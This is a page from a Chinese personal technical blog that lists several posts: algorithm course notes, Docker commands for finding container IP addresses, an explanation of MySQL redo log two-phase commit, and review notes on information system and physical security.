<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"lyuane.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="路漫漫其修远兮,吾将上下而求索">
<meta property="og:type" content="website">
<meta property="og:title" content="沄渊">
<meta property="og:url" content="http://lyuane.github.io/page/3/index.html">
<meta property="og:site_name" content="沄渊">
<meta property="og:description" content="路漫漫其修远兮,吾将上下而求索">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="沄渊">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://lyuane.github.io/page/3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>沄渊</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">沄渊</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">守得云开见月明</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="沄渊"
      src="/images/avatar.jpeg">
  <p class="site-author-name" itemprop="name">沄渊</p>
  <div class="site-description" itemprop="description">路漫漫其修远兮,吾将上下而求索</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2019/04/13/2019-04-13-%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E7%8F%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/04/13/2019-04-13-%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E7%8F%AD/" class="post-title-link" itemprop="url">牛客算法班</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-04-13 00:00:00" itemprop="dateCreated datePublished" datetime="2019-04-13T00:00:00+08:00">2019-04-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>本篇主要记录牛客算法班中的知识点，并不会详细介绍每种算法的思想（会在其他博客中介绍作为整理，同时也再系统的学习一遍）</p>
<p>所以本篇更多的可以当做学习路径参考</p>
<p>同时，因为之前已经接触过算法知识，所以在记录时我会把一些没见过的新奇的知识点重点标出来，大家可以参考一下(毕竟菜鸡，好多东西都没见过)</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>时间复杂度</p>
<p>冒泡排序</p>
<p>选择排序</p>
<p>插入排序  </p>
<p><strong>对数器！！！</strong></p>
<p>递归的系统行为   </p>
<p>递归的时间复杂度     <strong>master公式！！！</strong></p>
<p>归并排序   分治思想</p>
<p>归并排序 eg：  小和问题</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>荷兰国旗   </p>
<p>经典快速排序</p>
<p>利用荷兰国旗改进快速排序</p>
<p>随机快排  0（N*logN）</p>
<p>堆排序：完全二叉树   大根堆  小根堆</p>
<p>利用数组构建大根堆//1.40</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2019/03/21/2019-03-21-docker%E8%8E%B7%E5%8F%96%E5%AE%B9%E5%99%A8ip/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/03/21/2019-03-21-docker%E8%8E%B7%E5%8F%96%E5%AE%B9%E5%99%A8ip/" class="post-title-link" itemprop="url">docker获取容器IP</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-03-21 00:00:00" itemprop="dateCreated datePublished" datetime="2019-03-21T00:00:00+08:00">2019-03-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>偶尔在使用docker时需要知道某容器的IP地址，但是容器中通常没有ifconfig命令，因此总结了一些可以获取容器IP的命令</p>
<h3 id="0x01-进入容器中"><a href="#0x01-进入容器中" class="headerlink" title="0x01  进入容器中"></a>0x01  进入容器中</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p>功能类似于ifconfig      部分docker虽然没有ifconfig  但是这个命令还能用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>

<p>会显示本机以及软连接的容器IP</p>
<h3 id="0x02-在容器外-获取指定容器的IP"><a href="#0x02-在容器外-获取指定容器的IP" class="headerlink" title="0x02 在容器外 获取指定容器的IP"></a>0x02 在容器外 获取指定容器的IP</h3><p>以下三个命令都可以</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker inspect --format &#x27;&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;&#x27; &lt;container-ID&gt; </span><br><span class="line"></span><br><span class="line">docker inspect &lt;container id&gt; </span><br><span class="line"> </span><br><span class="line">docker inspect -f &#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; &lt;container_name_or_id&gt;</span><br></pre></td></tr></table></figure>

<p>docker inspect : 获取容器/镜像的元数据</p>
<p>因为docker inspect 获取的元数据过多，所以可以进行筛选</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect &lt;container id&gt; | grep IP</span><br></pre></td></tr></table></figure>



<h3 id="0x03-在容器外-获取全部容器的IP"><a href="#0x03-在容器外-获取全部容器的IP" class="headerlink" title="0x03 在容器外  获取全部容器的IP"></a>0x03 在容器外  获取全部容器的IP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -f &#x27;&#123;&#123;.Name&#125;&#125; - &#123;&#123;.NetworkSettings.IPAddress &#125;&#125;&#x27; $(docker ps -aq)</span><br><span class="line"></span><br><span class="line">docker inspect -f &#x27;&#123;&#123;.Name&#125;&#125; - &#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; $(docker ps -aq)</span><br><span class="line"></span><br><span class="line">docker inspect --format=&#x27;&#123;&#123;.Name&#125;&#125; - &#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; $(docker ps -aq)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2019/02/13/2019-02-13-redo%20log%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E4%B8%A4%E4%B8%AA%E7%8A%B6%E6%80%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/02/13/2019-02-13-redo%20log%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E4%B8%A4%E4%B8%AA%E7%8A%B6%E6%80%81/" class="post-title-link" itemprop="url">redo log为什么有两个状态</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-02-13 00:00:00" itemprop="dateCreated datePublished" datetime="2019-02-13T00:00:00+08:00">2019-02-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Mysql有两个重要的日志模块：redolog和binlog</p>
<p>当MySQL执行更新语句时，内部的流程</p>
<p>update T set c=c+1 where ID=2;</p>
<blockquote>
<ol>
<li>执行器找引擎取ID=2这行。  如果ID=2这行在cache中，直接返回；否则先从磁盘中读入内存，再返回</li>
<li>执行器拿到引擎给的行数据，在此+1，再调用引擎写入数据</li>
<li>引擎将新数据更新到内存，同时将更新操作记录到redo log中，redo log处于prepare状态。然后告知执行器执行完成，随时可以提交事务。</li>
<li>执行器生成binlog，并将其写入磁盘</li>
<li>执行器调用引擎的提交事务接口，引擎将redo log改成commit状态，更新完成。</li>
</ol>
</blockquote>
<p>为什么redo log必须要两阶段提交呢？</p>
<p>是为了保持两份日志间的逻辑一致</p>
<p>不妨用反证法</p>
<blockquote>
<ol>
<li><strong>先写redo log后写binlog</strong>。假设在redo log写完，binlog还没有写完的时候，MySQL进程异常重启。由于我们前面说过的，redo log写完之后，系统即使崩溃，仍然能够把数据恢复回来，所以恢复后这一行c的值是1。<br>但是由于binlog没写完就crash了，这时候binlog里面就没有记录这个语句。因此，之后备份日志的时候，存起来的binlog里面就没有这条语句。<br>然后你会发现，如果需要用这个binlog来恢复临时库的话，由于这个语句的binlog丢失，这个临时库就会少了这一次更新，恢复出来的这一行c的值就是0，与原库的值不同。</li>
<li><strong>先写binlog后写redo log</strong>。如果在binlog写完之后crash，由于redo log还没写，崩溃恢复以后这个事务无效，所以这一行c的值是0。但是binlog里面已经记录了“把c从0改成1”这个日志。所以，在之后用binlog来恢复的时候就多了一个事务出来，恢复出来的这一行c的值就是1，与原库的值不同。</li>
</ol>
</blockquote>
<p>可以看到，如果不使用“两阶段提交”，那么数据库的状态就有可能和用它的日志恢复出来的库的状态不一致。</p>
<p>简单来说，redo log和binlog都可以表示事务的提交状态，而两阶段提交就是让这两个状态保持逻辑上的一致。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2019/01/22/2019-01-22-%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/01/22/2019-01-22-%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">信息系统安全期末复习</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-01-22 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-22T00:00:00+08:00">2019-01-22</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、信息系统概述"><a href="#一、信息系统概述" class="headerlink" title="一、信息系统概述"></a>一、信息系统概述</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="信息系统？？？"><a href="#信息系统？？？" class="headerlink" title="信息系统？？？"></a>信息系统？？？</h3><p>一套用于收集，存储和处理数据以及提供信息，知识和数字产品的集成组件。商业公司和其他组织依靠信息系统来执行和管理其运营，与客户和供应商互动，并在市场中竞争。</p>
<h3 id="信息系统组成要素"><a href="#信息系统组成要素" class="headerlink" title="信息系统组成要素"></a>信息系统组成要素</h3><ul>
<li>主体 包括各类用户、支持人员以及技术管理和行政管理人员 人既是管理者，也是被管理者</li>
<li>客体 以计算机、网络互联设备、传输介质、信息内容及其操作系统、通信协议和应用程序所构成的物理的、逻辑的完整体系   是被管理、被控制的对象</li>
<li>环境 系统稳定、可靠运行所需的保障体系，包括建筑物、机房、动力保障与备份及应急恢复体系</li>
</ul>
<h3 id="信息系统架构？？？"><a href="#信息系统架构？？？" class="headerlink" title="信息系统架构？？？"></a>信息系统架构？？？</h3><p>架构是针对某种特定目标系统的普遍性问题而提供的具有体系性质的、通用的解决方案，是对复杂系统的一种共性的体系抽象，目的是帮助人们能够正确、合理地理解、设计和最终构建复杂的系统。</p>
<h3 id="信息系统复杂度？？？"><a href="#信息系统复杂度？？？" class="headerlink" title="信息系统复杂度？？？"></a>信息系统复杂度？？？</h3><p>体系结构是信息系统的基本结构，它的复杂性直接影响着系统的复杂度</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="互联网-与云计算、物联网、大数据的关系"><a href="#互联网-与云计算、物联网、大数据的关系" class="headerlink" title="互联网+与云计算、物联网、大数据的关系"></a>互联网+与云计算、物联网、大数据的关系</h3><ul>
<li>物联网是互联网大脑的感觉神经系统</li>
<li>云计算是互联网大脑的中枢神经系统</li>
<li>大数据是互联网智慧和意识产生的基础</li>
</ul>
<h3 id="信息系统架构：Zachman架构"><a href="#信息系统架构：Zachman架构" class="headerlink" title="信息系统架构：Zachman架构"></a>信息系统架构：Zachman架构</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547463594871.png" alt="1547463594871"></p>
<h3 id="信息系统体系架构分析的必要性"><a href="#信息系统体系架构分析的必要性" class="headerlink" title="信息系统体系架构分析的必要性"></a>信息系统体系架构分析的必要性</h3><p>从系统分析方法论的角度看，如果一个系统过于复杂，则对其进行分析的最好方法就是按照某种角度对整个系统进行解构</p>
<p>随着系统的解构，系统的复杂度也会被分解到各个部件中，因而分析各个部件将会相对容易，并且通过将各个部件的分析结果组合在一起将最终形成对整个系统的分析结果。</p>
<h3 id="信息系统架构复杂性：结构复杂性和动态复杂性"><a href="#信息系统架构复杂性：结构复杂性和动态复杂性" class="headerlink" title="信息系统架构复杂性：结构复杂性和动态复杂性"></a>信息系统架构复杂性：结构复杂性和动态复杂性</h3><p>体系结构的复杂性包括结构复杂性和动态复杂性，它们从不同的层次反映了体系结构的复杂性，并且都决定着系统复杂性</p>
<ul>
<li>结构复杂性：系统中的层次结构给系统建设带来的难度</li>
<li>动态复杂性：由于不同节点之间相互关系的多样性和差异性以及动态运行过程中的不确定性所带来的建设和维护的难度</li>
</ul>
<h3 id="信息系统架构复杂性的度量方法"><a href="#信息系统架构复杂性的度量方法" class="headerlink" title="信息系统架构复杂性的度量方法"></a>信息系统架构复杂性的度量方法</h3><p>第一章 P57</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h1 id="二、信息系统安全"><a href="#二、信息系统安全" class="headerlink" title="二、信息系统安全"></a>二、信息系统安全</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><h3 id="信息系统安全"><a href="#信息系统安全" class="headerlink" title="信息系统安全"></a>信息系统安全</h3><p>信息系统安全是指信息网络的硬件、软件及其系统中的数据受到保护，不受偶然的或者恶意的原因而遭到破坏、更改、泄露，系统连续可靠正常地运行，信息服务不中断。</p>
<h3 id="new信息系统的安全风险评估"><a href="#new信息系统的安全风险评估" class="headerlink" title="new信息系统的安全风险评估"></a>new信息系统的安全风险评估</h3><p>依据有关信息安全技术与管理标准，对信息系统及由其处理、传输和存储的信息的保密性、完整性和可用性等安全属性进行评价的过程</p>
<h3 id="信息系统安全的实质"><a href="#信息系统安全的实质" class="headerlink" title="信息系统安全的实质"></a>信息系统安全的实质</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548161515820.png" alt="1548161515820"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547466186097.png" alt="1547466186097"></p>
<h3 id="信息系统安全的三个阶段"><a href="#信息系统安全的三个阶段" class="headerlink" title="信息系统安全的三个阶段"></a>信息系统安全的三个阶段</h3><ol>
<li>基于通信保密</li>
<li>基于系统防护</li>
<li>基于信息保障</li>
</ol>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h3 id="产生信息系统安全问题的原因：安全威胁，自身的脆弱性"><a href="#产生信息系统安全问题的原因：安全威胁，自身的脆弱性" class="headerlink" title="产生信息系统安全问题的原因：安全威胁，自身的脆弱性"></a>产生信息系统安全问题的原因：安全威胁，自身的脆弱性</h3><ul>
<li>内部原因：信息系统自身存在脆弱性</li>
<li>外部原因：信息系统面临着来自外部的各种威胁</li>
</ul>
<h3 id="攻防不对称性"><a href="#攻防不对称性" class="headerlink" title="攻防不对称性"></a>攻防不对称性</h3><p>​    <img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547466111026.png" alt="1547466111026"></p>
<h3 id="信息系统安全架构（以云计算安全架构为例）"><a href="#信息系统安全架构（以云计算安全架构为例）" class="headerlink" title="信息系统安全架构（以云计算安全架构为例）"></a>信息系统安全架构（以云计算安全架构为例）</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547467970469.png" alt="1547467970469"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547467981005.png" alt="1547467981005"></p>
<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="信息系统安全保障模型–CMM框架"><a href="#信息系统安全保障模型–CMM框架" class="headerlink" title="信息系统安全保障模型–CMM框架"></a>信息系统安全保障模型–CMM框架</h4><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547467712369.png" alt="1547467712369"></p>
<h4 id="信息系统安全体系（技术体系、管理体系、标准体系、法律体系）"><a href="#信息系统安全体系（技术体系、管理体系、标准体系、法律体系）" class="headerlink" title="信息系统安全体系（技术体系、管理体系、标准体系、法律体系）"></a>信息系统安全体系（技术体系、管理体系、标准体系、法律体系）</h4><blockquote>
<p>以法律法规作为安全目标和安全需求的依据；</p>
<p>以标准规范体系作为检查、评估和测评的依据；</p>
<p>以管理体系作为风险分析与控制的理论基础与处理框架；</p>
<p>以技术体系作为风险控制的手段与安全管理的工具</p>
</blockquote>
<ul>
<li>信息系统安全技术体系</li>
</ul>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547467300671.png" alt="1547467300671"></p>
<ul>
<li><p>信息系统安全管理体系</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547467513881.png" alt="1547467513881"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547467542869.png" alt="1547467542869"></p>
</li>
<li><p>信息系统安全标准体系</p>
<ul>
<li>针对信息系统（包括产品）的安全性评测准则</li>
<li>针对不同安全产品的互操作性标准</li>
<li>针对使用信息系统的组织的安全管理标准</li>
</ul>
</li>
</ul>
<h2 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h2><p>特定应用的安全需求分析</p>
<p>设计简单的安全性测试方案（找不到在哪，先放这）</p>
<h1 id="三、物理安全"><a href="#三、物理安全" class="headerlink" title="三、物理安全"></a>三、物理安全</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><h3 id="物理安全概念"><a href="#物理安全概念" class="headerlink" title="物理安全概念"></a>物理安全概念</h3><p>物理安全又叫实体安全（Physical Security），是保护计算机设备、设施（网络及通信线路）免遭自然灾害（包括地震、水灾、火灾、有害气体等）、人为破坏及其他环境事故（如电磁污染等）破坏的措施和过程。</p>
<p>物理安全技术主要针对计算机及网络系统的环境、场地、设备和通信线路等采取的安全技术和管理措施。</p>
<h3 id="物理安全体系结构"><a href="#物理安全体系结构" class="headerlink" title="物理安全体系结构"></a>物理安全体系结构</h3><p>环境安全、设备安全、介质安全、电源安全、线路安全、介质安全</p>
<h3 id="电源调整器"><a href="#电源调整器" class="headerlink" title="电源调整器"></a>电源调整器</h3><p>隔离器、稳压器、滤波器</p>
<h3 id="不间断电源"><a href="#不间断电源" class="headerlink" title="不间断电源"></a>不间断电源</h3><ul>
<li>持续供电型UPS</li>
<li>马达发电机</li>
<li>顺向转换型UPS</li>
<li>逆向转换型UPS</li>
</ul>
<h3 id="电磁泄露"><a href="#电磁泄露" class="headerlink" title="电磁泄露"></a>电磁泄露</h3><p>电磁泄漏指电子设备的杂散电磁能量通过导线或空间向外扩散。<br> 任何处于工作状态的电磁信息设备，如计算机、打印机、复印机、传真机、手机电话等，都存在不同程度的电磁泄漏问题，这是无法摆脱的电磁现象。<br> 如果这些泄漏“夹带”着设备所处理的信息，均可构成了电磁信息泄漏。</p>
<p>泄露途径： 以电磁波形式的辐射泄露    电源线、控制线、信号线和地线造成的传导泄露</p>
<h3 id="电磁战"><a href="#电磁战" class="headerlink" title="电磁战"></a>电磁战</h3><p>电磁战主要是指通信、雷达、光电、网络对抗战法和电磁频谱管控行动能力的战斗</p>
<p>目的是干拢敌方的信息联系、阻断信息沟通，使敌方致盲、失去应有的战斗力</p>
<h3 id="机房安全的相关国标"><a href="#机房安全的相关国标" class="headerlink" title="机房安全的相关国标"></a>机房安全的相关国标</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547608094407.png" alt="1547608094407"></p>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><h3 id="光纤能否被窃听"><a href="#光纤能否被窃听" class="headerlink" title="光纤能否被窃听"></a>光纤能否被窃听</h3><p>光纤通信线曾被认为是不可搭线窃听的。光纤没有电磁辐射，所以也不能用电磁感应窃密</p>
<p>但是光纤的最大长度有限制，长于这一长度的光纤系统必须定期地放大（复制）信号。完成这一操作的设备（复制器）是光纤通信系统的安全薄弱环节</p>
<h3 id="-电源安全的重要性"><a href="#-电源安全的重要性" class="headerlink" title=" 电源安全的重要性"></a> 电源安全的重要性</h3><p>电源是计算机网络系统的命脉，电源系统的稳定可靠是计算机网络系统正常运行的先决条件。</p>
<h3 id="-GB-T-2887-2000规定的三类供电方式"><a href="#-GB-T-2887-2000规定的三类供电方式" class="headerlink" title=" GB/T 2887-2000规定的三类供电方式"></a> GB/T 2887-2000规定的三类供电方式</h3><ul>
<li>一类供电：需要建立不间断供电系统</li>
<li>二类供电、需要建立备用的供电系统</li>
<li>三类供电：按一般用户供电考虑</li>
</ul>
<h3 id="-电源防护措施："><a href="#-电源防护措施：" class="headerlink" title=" 电源防护措施："></a> 电源防护措施：</h3><ul>
<li>电源调整器</li>
<li>UPS（不间断电源）</li>
<li>电源相关操作（系统接地，电源匹配，电缆连接和卡的插拔，正确开关机）</li>
</ul>
<h3 id="-防静电措施"><a href="#-防静电措施" class="headerlink" title=" 防静电措施"></a> 防静电措施</h3><ul>
<li>机房的内装修材料一般应避免使用挂毯、地毯等吸尘、容易产生静电的材料，而应采用乙烯材料。为了防静电，机房一般要安装防静电地板。</li>
<li>机房内应保持一定湿度，特别是在干燥季节应适当增加空气湿度，以免因<br>干燥而产生静电</li>
</ul>
<h3 id="-常见的接地与防雷方法-P33"><a href="#-常见的接地与防雷方法-P33" class="headerlink" title=" 常见的接地与防雷方法  P33"></a> 常见的接地与防雷方法  P33</h3><ul>
<li>良好的接地设备</li>
<li>计算机房的接地系统要按计算机系统本身和场地的各种地线系统的设计要求进行具体实施</li>
<li>机房外部防雷应使用接闪器、引下线和接地装置，吸引雷电流，并为其泄放提供一条低阻值通道</li>
